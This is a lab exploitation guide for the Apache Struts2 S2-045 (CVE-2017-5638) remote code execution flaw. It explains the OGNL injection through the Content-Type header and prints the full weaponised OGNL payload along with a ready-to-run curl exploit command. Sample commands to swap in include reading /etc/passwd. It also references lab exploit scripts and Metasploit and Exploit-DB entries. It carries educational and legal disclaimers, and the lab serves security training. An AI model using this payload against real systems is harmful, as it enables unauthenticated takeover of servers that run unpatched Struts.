# S2-045 (CVE-2017-5638) Exploitation Guide

## Table of Contents
1. [Overview](#overview)
2. [Vulnerability Details](#vulnerability-details)
3. [Technical Mechanism](#technical-mechanism)
4. [Exploitation Procedure](#exploitation-procedure)
5. [References](#references)

---

## Overview

**CVE-2017-5638** (also known as **S2-045**) is a critical Remote Code Execution (RCE) vulnerability in Apache Struts2 framework. It affects:

- **Struts 2.3.5** through **2.3.31**
- **Struts 2.5** through **2.5.10.1**

This vulnerability allows attackers to execute arbitrary code on the server by sending a specially crafted `Content-Type` header in multipart/form-data requests.

### Impact
- **Severity**: Critical (CVSS 10.0)
- **Attack Vector**: Network (remote exploitation possible)
- **Authentication**: Not required
- **Impact**: Complete system compromise (RCE)

---

## Vulnerability Details

### Root Cause

The vulnerability exists in the Jakarta Multipart parser used by Struts2 to handle file uploads. When processing multipart requests, Struts2 attempts to parse the `Content-Type` header to extract the boundary parameter. If the header contains malformed data, an exception is thrown.

**The critical flaw**: The exception message is constructed using OGNL (Object-Graph Navigation Language) expression evaluation, and user-controlled input from the `Content-Type` header is directly interpolated into this OGNL expression without proper sanitization.

### Affected Components

1. **Jakarta Multipart Parser** (`org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest`)
2. **Error Handling** in multipart request processing
3. **OGNL Expression Evaluator** (used in error message construction)

### Vulnerability Timeline

- **Discovered**: March 2017
- **Public Disclosure**: March 7, 2017
- **CVE Assigned**: CVE-2017-5638
- **Patched Versions**: 
  - Struts 2.3.32
  - Struts 2.5.10.1

---

## Technical Mechanism

### 1. Multipart Request Processing

When a Struts2 application receives a `multipart/form-data` request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 1234

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="test.txt"
Content-Type: text/plain

[file content]
------WebKitFormBoundary--
```

The framework uses the Jakarta Multipart parser to:
1. Extract the boundary from the `Content-Type` header
2. Parse the multipart body
3. Extract form fields and file uploads

### 2. Error Handling Vulnerability

In vulnerable versions, when parsing fails, the error handling code constructs an error message:

```java
// Simplified vulnerable code pattern
String errorMessage = "Invalid Content-Type: " + contentType;
// contentType contains user input from HTTP header
```

The problem: If `contentType` contains OGNL expressions like `${...}` or `%{...}`, these expressions are **evaluated** during error message construction.

### 3. OGNL Injection

OGNL (Object-Graph Navigation Language) is a powerful expression language used by Struts2 for:
- Property access
- Method invocation
- Type conversion
- Expression evaluation

**OGNL expressions can execute Java code**, including:
- System command execution
- File system access
- Network operations
- Arbitrary Java method calls

### 4. Exploitation Vector

The attack works by:

1. **Sending a malformed Content-Type header** containing an OGNL expression:
   ```
   Content-Type: %{(#_='multipart/form-data').(#cmd='whoami').(...OGNL payload...)}
   ```

2. **Triggering parsing error**: The malformed header causes the multipart parser to throw an exception

3. **OGNL evaluation**: The exception handler evaluates the OGNL expression in the error message

4. **Command execution**: The OGNL payload executes system commands and writes output to the HTTP response

### 5. OGNL Payload Structure

A typical S2-045 exploit payload has this structure:

```ognl
%{
  (#_='multipart/form-data').
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):(
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm))
  )).
  (#cmd='COMMAND_TO_EXECUTE').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).
  (#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())
}
```

**Payload breakdown**:
- Sets up OGNL context with full member access
- Clears security restrictions (excluded packages/classes)
- Constructs command to execute (OS-aware: Windows vs Unix)
- Creates ProcessBuilder to execute the command
- Redirects process output to HTTP response stream
- Flushes output to client

---

## Exploitation Procedure

### Prerequisites

1. **Vulnerable Application**: Struts 2.3.5 - 2.3.31 or 2.5 - 2.5.10.1
2. **Endpoint**: Any endpoint that accepts multipart/form-data (file upload)
3. **Network Access**: Ability to send HTTP requests to the target

### Step-by-Step Exploitation

#### Step 1: Identify Vulnerable Application

Check if the application uses a vulnerable Struts2 version:

```bash
# Check HTTP response headers for Struts version
curl -I http://target/application/

# Check error pages for framework information
curl http://target/application/nonexistent
```

Look for indicators:
- Error messages mentioning "Struts"
- Stack traces showing Struts2 classes
- Version information in response headers

#### Step 2: Locate Multipart Endpoint

Find an endpoint that accepts file uploads:

```bash
# Common endpoints
/upload
/file/upload
/action/upload
```

Test with a legitimate request:

```bash
curl -X POST http://target/upload \
  -F "file=@test.txt" \
  -v
```

#### Step 3: Construct Malicious Request

Build the exploit request with OGNL payload in Content-Type header:

```bash
# Simple test: execute 'whoami'
curl -X POST http://target/upload \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -F "upload=@/dev/null"
```

#### Step 4: Execute Commands

Replace `whoami` in the payload with any command:

```bash
# List files
#cmd='ls -la /tmp'

# Read file
#cmd='cat /etc/passwd'

# Network reconnaissance
#cmd='ifconfig'
```

#### Step 5: Extract Output

Command output appears in:
- HTTP response body
- Error messages
- Stack traces

Parse the response to extract command output.

### Using the Lab's Exploit Scripts

This lab includes exploit demonstration scripts:

#### Option 1: Bash Script

```bash
# Run exploit container
docker compose --profile exploit up exploit

# Or run directly
./exploit/demo_exploit.sh
```

#### Option 2: Python Script

```bash
# Direct execution
python3 exploit/exploit.py http://127.0.0.1:8081/struts-lab 'whoami'

# Or in container
docker compose run --rm exploit python3 exploit.py \
  http://app-vulnerable:8080/struts-lab 'id'
```

### Expected Results

**Successful exploitation**:
- HTTP 200 or 500 response
- Command output visible in response body
- No error about invalid Content-Type

**Failed exploitation**:
- HTTP 400/403 (blocked by WAF)
- HTTP 500 with no command output (patched version)
- Connection refused (application down)

---

## References

### Official Advisories

1. **Apache Struts Security Bulletin**: 
   - https://cwiki.apache.org/confluence/display/WW/S2-045
   - https://struts.apache.org/docs/s2-045.html

2. **CVE Details**:
   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
   - CVSS Score: 10.0 (Critical)

3. **NVD Entry**:
   - https://nvd.nist.gov/vuln/detail/CVE-2017-5638

### Public Exploits

1. **Metasploit Module**:
   - Module: `exploit/multi/http/struts2_content_type_ognl`
   - Usage: `use exploit/multi/http/struts2_content_type_ognl`

2. **Exploit-DB**:
   - https://www.exploit-db.com/exploits/41570
   - https://www.exploit-db.com/exploits/41614

3. **GitHub PoCs**:
   - Various proof-of-concept implementations available
   - Search: "struts2 s2-045 exploit"

### Security Research

1. **Original Discovery**:
   - Reported by security researchers in March 2017
   - Rapidly weaponized after public disclosure

2. **Analysis Papers**:
   - OGNL injection techniques
   - Struts2 security architecture analysis

### Mitigation References

1. **Apache Struts Security Best Practices**:
   - https://struts.apache.org/security/

2. **OWASP Guidelines**:
   - Input validation
   - Output encoding
   - Security headers

---

## Security Notes

### Ethical Use

This exploitation guide is provided for:
- **Educational purposes** only
- **Security research** in controlled environments
- **Penetration testing** with explicit authorization
- **Defensive security** training

### Legal Warning

**Unauthorized access to computer systems is illegal** in most jurisdictions. Only use these techniques on:
- Systems you own
- Systems with explicit written authorization
- Isolated lab environments

### Responsible Disclosure

If you discover a vulnerable Struts2 application:
1. **Do not exploit** without authorization
2. **Report** to the application owner
3. **Follow** responsible disclosure practices
4. **Assist** with patching if possible

---

## Conclusion

S2-045 demonstrates the critical importance of:
- **Input validation** (never trust user input)
- **Secure error handling** (don't evaluate user input in error messages)
- **Framework updates** (keep dependencies patched)
- **Defense in depth** (WAF, rate limiting, monitoring)

Understanding this vulnerability helps security professionals:
- Recognize similar patterns in other applications
- Implement proper defenses
- Conduct effective security assessments
- Educate development teams

